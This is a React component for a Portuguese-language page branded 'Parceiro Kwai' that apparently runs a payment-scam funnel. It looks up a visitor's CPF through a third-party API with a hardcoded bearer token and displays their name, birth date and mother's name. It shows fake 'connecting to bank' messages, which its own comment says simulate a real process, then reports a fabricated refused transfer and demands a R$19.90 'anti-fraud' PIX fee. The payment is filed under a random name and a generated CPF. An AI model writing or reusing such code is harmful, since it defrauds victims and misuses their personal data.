import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

interface PixDataType {
  transaction_id?: string;
  pix_data?: {
    qrCodeText?: string;
    qrCode?: string;
  };
}

interface CpfDataType {
  CPF: string;
  NOME: string;
  SEXO: string;
  NASC: string;
  NOME_MAE: string;
}

const Upsell3 = () => {
  const navigate = useNavigate();
  const [currentStep, setCurrentStep] = useState<'cpf' | 'cpf-validation' | 'pix-validation' | 'pix-loading' | 'payment'>('cpf');
  const [cpf, setCpf] = useState('');
  const [cpfData, setCpfData] = useState<CpfDataType | null>(null);
  const [pixKey, setPixKey] = useState('');
  const [isLoadingCpf, setIsLoadingCpf] = useState(false);
  const [isGeneratingPix, setIsGeneratingPix] = useState(false);
  const [showPixPopup, setShowPixPopup] = useState(false);
  const [isPixPopupAnimating, setIsPixPopupAnimating] = useState(false);
  const [isClosingPixPopup, setIsClosingPixPopup] = useState(false);
  const [pixData, setPixData] = useState<PixDataType | null>(null);
  const [copied, setCopied] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<string>("");
  const [loadingMessage, setLoadingMessage] = useState("Iniciando validação...");
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Cleanup interval on unmount
  useEffect(() => {
    return () => {
      if (checkIntervalRef.current) {
        clearInterval(checkIntervalRef.current);
      }
    };
  }, []);

  // Reset copied state after showing
  useEffect(() => {
    if (copied) {
      const timer = setTimeout(() => setCopied(false), 2000);
      return () => clearTimeout(timer);
    }
  }, [copied]);

  const formatCpf = (value: string) => {
    const numericValue = value.replace(/\D/g, '');
    return numericValue
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})/, '$1-$2')
      .replace(/(-\d{2})\d+?$/, '$1');
  };

  const validateCpf = async () => {
    if (cpf.length !== 14) return;
    
    setIsLoadingCpf(true);
    const cleanCpf = cpf.replace(/\D/g, '');
    
    try {
      const response = await fetch(`https://api.dataget.site/api/v1/cpf/${cleanCpf}`, {
        method: 'GET',
        headers: {
          'Authorization': 'Bearer 77d1f435eff5c06994834dbc23ff44ec8ce57dadc7afe6949986fcfd44e7e5c5',
          'Content-Type': 'application/json'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setCpfData(data);
        setPixKey(cleanCpf);
        setCurrentStep('cpf-validation');
      } else {
        alert('CPF não encontrado ou inválido. Tente novamente.');
      }
    } catch (error) {
      console.error('Erro ao validar CPF:', error);
      alert('Erro ao validar CPF. Tente novamente.');
    } finally {
      setIsLoadingCpf(false);
    }
  };

  const confirmCpfData = () => {
    setCurrentStep('pix-validation');
  };

  const validatePixKey = () => {
    setCurrentStep('pix-loading');
    
    // Sequência de mensagens de loading para simular processo real
    const loadingSequence = [
      { message: "Conectando com o banco...", duration: 800 },
      { message: "Validando chave PIX...", duration: 600 },
      { message: "Processando transferência...", duration: 700 },
      { message: "Aguardando confirmação...", duration: 500 }
    ];

    let currentIndex = 0;
    setLoadingMessage(loadingSequence[0].message);

    const updateLoading = () => {
      if (currentIndex < loadingSequence.length - 1) {
        currentIndex++;
        setLoadingMessage(loadingSequence[currentIndex].message);
        setTimeout(updateLoading, loadingSequence[currentIndex].duration);
      } else {
        // Após todas as mensagens, mostrar o erro
        setTimeout(() => {
          setCurrentStep('payment');
        }, 500);
      }
    };

    setTimeout(updateLoading, loadingSequence[0].duration);
  };

  const generateQRCodeImage = (text: string) => {
    return `https://quickchart.io/qr?text=${encodeURIComponent(text)}&size=300`;
  };

  const getUtmParams = (): string | null => {
    if (typeof window === 'undefined') return null;

    const params = new URLSearchParams(window.location.search);
    const utmParams: Record<string, string | null> = {};

    const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'];

    utmKeys.forEach(key => {
      if (params.has(key)) {
        utmParams[key] = params.get(key);
      }
    });

    if (Object.keys(utmParams).length === 0) {
      return JSON.stringify({
        utm_source: '7f52b1f8-0a0c-4e17-82c7-88e97b73f0d5::Teste_xTracky::::',
        utm_medium: 'Xtracky',
        utm_campaign: 'servico'
      });
    }

    return JSON.stringify(utmParams);
  };

  const generateRandomName = () => {
    const firstNames = ['João', 'Maria', 'Pedro', 'Ana', 'Carlos', 'Mariana', 'Lucas', 'Juliana', 'Fernando', 'Patricia'];
    const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Almeida', 'Pereira', 'Gomes', 'Martins'];
    
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    
    return `${firstName} ${lastName}`;
  };

  const generateRandomCPF = (): string => {
    const rand = (n: number) => Math.floor(Math.random() * n);
    const n = Array(9).fill(0).map(() => rand(9));
    
    let d1 = n.reduce((acc, val, idx) => acc + (val * (10 - idx)), 0);
    d1 = 11 - (d1 % 11);
    if (d1 >= 10) d1 = 0;
    
    let d2 = n.reduce((acc, val, idx) => acc + (val * (11 - idx)), 0) + (d1 * 2);
    d2 = 11 - (d2 % 11);
    if (d2 >= 10) d2 = 0;
    
    return n.join('') + d1 + d2;
  };

  const checkPaymentStatus = async (transactionId: string) => {
    try {
      const response = await fetch("https://cdn.parceiro-digi.shop/PaymentController.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          action: "check_payment",
          payment_id: transactionId
        })
      });
      
      const data = await response.json();
      
      if (data.status === "APPROVED") {
        setPaymentStatus("approved");
        if (checkIntervalRef.current) {
          clearInterval(checkIntervalRef.current);
          checkIntervalRef.current = null;
        }
        setTimeout(() => {
          navigate('/upsell4');
        }, 2000);
      }
    } catch (error) {
      console.error("Erro ao verificar status do pagamento:", error);
    }
  };

  const startPaymentStatusCheck = (transactionId: string) => {
    if (checkIntervalRef.current) {
      clearInterval(checkIntervalRef.current);
    }
    
    checkPaymentStatus(transactionId);
    checkIntervalRef.current = setInterval(() => checkPaymentStatus(transactionId), 10000);
  };

  const handleValidatePixKey = async () => {
    setIsGeneratingPix(true);
    
    try {

      const utmParamsString = localStorage.getItem("utm_params");
      const utmParams = utmParamsString ? JSON.parse(utmParamsString) : {};

      const response = await fetch("https://cdn.parceiro-digi.shop/PaymentController.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          action: "generate_pix",
          name: generateRandomName(),
          email: "cliente@email.com",
          cpf: generateRandomCPF(),
          telefone: "19298373473",
          amount: 1990,
          item_title: "KwaiUPsell3",
           utmQuery: getUtmParams(),
          referrerUrl: "https://www.exemplo.com/pagina"
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPixData({
          ...data,
          pix_data: {
            ...data.pix_data,
            qrCode: generateQRCodeImage(data.pix_data.qrCodeText)
          }
        });
        startPaymentStatusCheck(data.transaction_id);
        setShowPixPopup(true);
        setIsPixPopupAnimating(true);
      }
    } catch (error) {
      console.error("Erro ao gerar PIX:", error);
    } finally {
      setIsGeneratingPix(false);
    }
  };

  const handleCopyPix = (): void => {
    if (pixData?.pix_data?.qrCodeText) {
      try {
        navigator.clipboard.writeText(pixData.pix_data.qrCodeText)
          .then(() => {
            setCopied(true);
            setShowModal(true);
          })
          .catch((err) => {
            console.error('Falha ao copiar texto: ', err);
          });
      } catch (err) {
        console.error('Erro ao acessar clipboard: ', err);
      }
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header Kwai */}
      <div className="bg-[#FF4906] text-white px-4 py-4">
        <div className="flex items-center justify-center">
          <img 
            src="/img/parceirokwai.svg" 
            alt="Parceiro Kwai" 
            className="h-8"
          />
        </div>
      </div>

      <div className="px-4 py-6 max-w-md mx-auto">
        {/* Etapa 1: Validação do CPF */}
        {currentStep === 'cpf' && (
          <>
            <div className="bg-blue-100 border border-blue-400 rounded-lg p-3 mb-6 flex items-start space-x-2">
              <div className="text-blue-700 mt-0.5">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
              </div>
              <span className="text-blue-800 text-sm font-medium">
                Validação de Dados - Etapa 1/2
              </span>
            </div>

            <h1 className="text-xl font-bold text-gray-900 mb-4 leading-tight">
              Validação do seu CPF
            </h1>

            <p className="text-gray-700 text-sm mb-6">
              Para garantir a segurança das suas informações e liberação dos valores, precisamos validar seus dados.
            </p>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">
                Informe seu CPF:
              </label>
              <input
                type="text"
                value={cpf}
                onChange={(e) => setCpf(formatCpf(e.target.value))}
                placeholder="000.000.000-00"
                maxLength={14}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#FF4906] focus:border-transparent"
              />
            </div>

            <button 
              onClick={validateCpf}
              disabled={cpf.length !== 14 || isLoadingCpf}
              className="w-full bg-[#FF4906] text-white font-bold py-4 rounded-lg text-lg mb-6 hover:bg-[#e04205] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoadingCpf ? (
                <div className="flex items-center justify-center space-x-2">
                  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  <span>VALIDANDO DADOS...</span>
                </div>
              ) : (
                "Validar CPF"
              )}
            </button>
          </>
        )}

        {/* Etapa 2: Confirmação dos dados do CPF */}
        {currentStep === 'cpf-validation' && cpfData && (
          <>
            <div className="bg-green-100 border border-green-400 rounded-lg p-3 mb-6 flex items-start space-x-2">
              <div className="text-green-700 mt-0.5">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
              </div>
              <span className="text-green-800 text-sm font-medium">
                Dados Validados com Sucesso
              </span>
            </div>

            <h1 className="text-xl font-bold text-gray-900 mb-4 leading-tight">
              Confirme seus dados
            </h1>

            <div className="bg-gray-100 rounded-lg p-4 mb-6">
              <h2 className="font-bold text-gray-900 mb-3">Dados encontrados:</h2>
              
              <div className="space-y-2">
                <div className="flex justify-between">
                  <span className="text-gray-700">CPF:</span>
                  <span className="font-semibold">{cpfData.CPF}</span>
                </div>
                
                <div className="flex justify-between">
                  <span className="text-gray-700">Nome:</span>
                  <span className="font-semibold">{cpfData.NOME}</span>
                </div>
                
                <div className="flex justify-between">
                  <span className="text-gray-700">Data de Nascimento:</span>
                  <span className="font-semibold">{cpfData.NASC}</span>
                </div>
                
                <div className="flex justify-between">
                  <span className="text-gray-700">Sexo:</span>
                  <span className="font-semibold">{cpfData.SEXO}</span>
                </div>
                
                <div className="flex justify-between">
                  <span className="text-gray-700">Nome da Mãe:</span>
                  <span className="font-semibold">{cpfData.NOME_MAE}</span>
                </div>
              </div>
            </div>

            <button 
              onClick={confirmCpfData}
              className="w-full bg-[#FF4906] text-white font-bold py-4 rounded-lg text-lg mb-6 hover:bg-[#e04205] transition-colors"
            >
              Confirmar Dados
            </button>
          </>
        )}

        {/* Etapa 3: Validação da chave PIX */}
        {currentStep === 'pix-validation' && (
          <>
            <div className="bg-blue-100 border border-blue-400 rounded-lg p-3 mb-6 flex items-start space-x-2">
              <div className="text-blue-700 mt-0.5">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
              </div>
              <span className="text-blue-800 text-sm font-medium">
                Validação de Chave PIX - Etapa 2/2
              </span>
            </div>

            <h1 className="text-xl font-bold text-gray-900 mb-4 leading-tight">
              Validação da chave PIX
            </h1>

            <p className="text-gray-700 text-sm mb-6">
              Confirme ou edite sua chave PIX para recebimento dos valores.
            </p>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">
                Chave PIX (CPF):
              </label>
              <input
                type="text"
                value={pixKey}
                onChange={(e) => setPixKey(e.target.value.replace(/\D/g, ''))}
                placeholder="Digite sua chave PIX"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#FF4906] focus:border-transparent"
              />
            </div>

            <button 
              onClick={validatePixKey}
              className="w-full bg-[#FF4906] text-white font-bold py-4 rounded-lg text-lg mb-6 hover:bg-[#e04205] transition-colors"
            >
              Confirmar Chave PIX
            </button>
          </>
        )}

        {/* Etapa 4: Loading da validação PIX */}
        {currentStep === 'pix-loading' && (
          <>
            <div className="bg-blue-100 border border-blue-400 rounded-lg p-3 mb-6 flex items-start space-x-2">
              <div className="text-blue-700 mt-0.5">
                <svg className="animate-spin h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
              </div>
              <span className="text-blue-800 text-sm font-medium">
                Processando Validação...
              </span>
            </div>

            <h1 className="text-xl font-bold text-gray-900 mb-4 leading-tight">
              Validando sua chave PIX
            </h1>

            <div className="flex flex-col items-center justify-center py-12">
              <div className="relative">
                <svg className="animate-spin h-16 w-16 text-[#FF4906] mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
              </div>
              
              <div className="text-center">
                <p className="text-lg font-semibold text-gray-900 mb-2">{loadingMessage}</p>
                <p className="text-sm text-gray-600">
                  Aguarde enquanto validamos sua chave PIX...
                </p>
              </div>
            </div>

            <div className="bg-gray-100 rounded-lg p-4">
              <p className="text-sm text-gray-600 text-center">
                Este processo pode levar alguns segundos. Não feche esta página.
              </p>
            </div>
          </>
        )}

        {/* Etapa 5: Resultado da validação e pagamento */}
        {currentStep === 'payment' && (
          <>
            <div className="bg-red-100 border border-red-400 rounded-lg p-3 mb-6 flex items-start space-x-2">
              <div className="text-red-700 mt-0.5">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
                </svg>
              </div>
              <span className="text-red-800 text-sm font-medium">
                Validação Antifraude Necessária
              </span>
            </div>

            <h1 className="text-xl font-bold text-gray-900 mb-4 leading-tight">
              Estamos quase lá! Falta só confirmar sua chave Pix.
            </h1>

            <div className="bg-red-50 border-l-4 border-red-400 p-4 mb-6">
              <p className="text-red-800 text-sm mb-3">
                Enviamos um Pix para a chave informada, mas o retorno do banco foi:
              </p>
              <p className="text-red-700 font-semibold mb-3">
                ❌ Transação recusada por bloqueio de segurança.
              </p>
              <p className="text-red-800 text-sm">
                Para liberar o valor total do seu recebimento e ativar a chave para saques automáticos, é necessário realizar uma validação antifraude, com uma pequena taxa.
              </p>
            </div>

            <div className="bg-gray-100 rounded-lg p-4 mb-6">
              <h2 className="font-bold text-gray-900 mb-3">Após essa etapa, seus pagamentos serão:</h2>
              
              <div className="space-y-3">
                <div className="flex items-start space-x-3">
                  <div className="bg-[#FF4906] rounded-full p-1 mt-0.5">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="white">
                      <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                    </svg>
                  </div>
                  <span className="text-gray-700 text-sm">Liberados automaticamente</span>
                </div>
                
                <div className="flex items-start space-x-3">
                  <div className="bg-[#FF4906] rounded-full p-1 mt-0.5">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="white">
                      <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                    </svg>
                  </div>
                  <span className="text-gray-700 text-sm">Depositados com prioridade</span>
                </div>
                
                <div className="flex items-start space-x-3">
                  <div className="bg-[#FF4906] rounded-full p-1 mt-0.5">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="white">
                      <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                    </svg>
                  </div>
                  <span className="text-gray-700 text-sm">Vinculados à chave que você já cadastrou</span>
                </div>
              </div>

              <div className="mt-4 flex justify-between font-bold text-lg border-t pt-3">
                <span>Valor da validação</span>
                <span className="text-[#FF4906]">R$19,90</span>
              </div>
            </div>

            <button 
              onClick={handleValidatePixKey}
              disabled={isGeneratingPix}
              className="w-full bg-[#FF4906] text-white font-bold py-4 rounded-lg text-lg mb-6 hover:bg-[#e04205] transition-colors"
            >
              {isGeneratingPix ? (
                <div className="flex items-center justify-center space-x-2">
                  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  <span>GERANDO PIX...</span>
                </div>
              ) : (
                "Validar Chave Pix"
              )}
            </button>

            <p className="text-center text-sm text-gray-600">
              Conclua essa etapa final e desbloqueie seus recebimentos.
            </p>
          </>
        )}
      </div>

      {/* Pop-up PIX na parte inferior */}
      {showPixPopup && (
        <div className="fixed inset-0 flex items-end justify-center z-50">
          <div className={`bg-white w-full max-w-md rounded-t-2xl p-6 shadow-2xl transform transition-all duration-1500 ease-out ${
            isClosingPixPopup 
              ? 'translate-y-full opacity-0' 
              : isPixPopupAnimating 
                ? 'translate-y-0 opacity-100' 
                : 'translate-y-full opacity-0'
          }`}>
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-lg font-bold text-gray-900">Validação via PIX</h3>
              <button 
                onClick={() => {
                  setIsClosingPixPopup(true);
                  setTimeout(() => {
                    setShowPixPopup(false);
                    setIsClosingPixPopup(false);
                    setIsPixPopupAnimating(false);
                  }, 500);
                }}
                className="text-gray-400 hover:text-gray-600 transition-colors duration-200"
              >
                <svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            <div className="text-center mb-4">
              <p className="text-gray-600 text-sm">Valor da validação</p>
              <p className="text-2xl font-bold text-gray-900">R$ 19,90</p>
            </div>

            <div className="flex justify-center mb-4">
              {pixData?.pix_data?.qrCode ? (
                <div className="w-40 h-40 bg-white border-2 border-gray-300 rounded-lg flex items-center justify-center">
                  <img 
                    src={pixData.pix_data.qrCode} 
                    alt="QR Code PIX" 
                    className="w-full h-full p-2"
                    onError={(e: React.SyntheticEvent<HTMLImageElement>) => {
                      const target = e.currentTarget as HTMLImageElement;
                      target.onerror = null;
                      target.src = "https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=00020126870014br.gov.bcb.pix&choe=UTF-8";
                    }}
                  />
                </div>
              ) : (
                <div className="w-40 h-40 bg-gray-200 border-2 border-gray-300 rounded-lg flex items-center justify-center">
                  <div className="text-center">
                    <svg className="animate-spin h-8 w-8 text-blue-500 mx-auto" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <p className="text-gray-500 text-sm mt-2">Gerando QR Code...</p>
                  </div>
                </div>
              )}
            </div>

            <div className="mb-4">
              <p className="text-sm text-gray-600 mb-2">Chave PIX:</p>
              <div className="flex items-center bg-gray-100 rounded-lg p-3">
                <code className="flex-1 text-sm font-mono text-gray-800 break-all">
                  {pixData?.pix_data?.qrCodeText || "Gerando chave PIX..."}
                </code>
                <button 
                  onClick={handleCopyPix}
                  className="ml-2 bg-[#FF4906] text-white px-3 py-2 rounded text-sm font-medium hover:bg-[#e04205] transition-colors"
                  disabled={!pixData?.pix_data?.qrCodeText}
                >
                  {copied ? "Copiado!" : "Copiar"}
                </button>
              </div>
            </div>

            <div className="bg-orange-50 border border-orange-200 rounded-lg p-3 mb-4">
              <p className="text-orange-800 text-sm">
                <strong>Instruções:</strong> Escaneie o QR Code ou copie a chave PIX para realizar o pagamento de R$ 19,90. 
                Após a confirmação, sua chave será validada automaticamente.
              </p>
            </div>

            {paymentStatus === "approved" && (
              <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4">
                <p className="text-green-800 text-sm font-medium">
                  Pagamento aprovado! Sua chave PIX foi validada com sucesso.
                </p>
              </div>
            )}

            <button 
              onClick={() => {
                setIsClosingPixPopup(true);
                setTimeout(() => {
                  setShowPixPopup(false);
                  setIsClosingPixPopup(false);
                  setIsPixPopupAnimating(false);
                }, 500);
              }}
              className={`w-full ${
                paymentStatus === "approved" ? "bg-green-500 hover:bg-green-600 text-white" : "bg-gray-200 text-gray-700"
              } font-medium py-3 rounded-lg transition-all duration-200`}
            >
              {paymentStatus === "approved" ? "Continuar" : "Já realizei o pagamento"}
            </button>
          </div>
        </div>
      )}

      {/* Modal de confirmação de cópia */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-lg p-6 max-w-sm w-full">
            <div className="flex flex-col items-center text-center">
              <div className="bg-green-100 rounded-full p-3 mb-4">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                  <polyline points="22 4 12 14.01 9 11.01"></polyline>
                </svg>
              </div>
              <h3 className="text-lg font-bold text-gray-900 mb-2">Código copiado!</h3>
              <p className="text-gray-600 mb-4">O código PIX foi copiado para sua área de transferência.</p>
              <button 
                onClick={() => setShowModal(false)}
                className="w-full bg-[#FF4906] text-white font-medium py-2 px-4 rounded-lg hover:bg-[#e04205] transition-colors"
              >
                Fechar
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Upsell3;
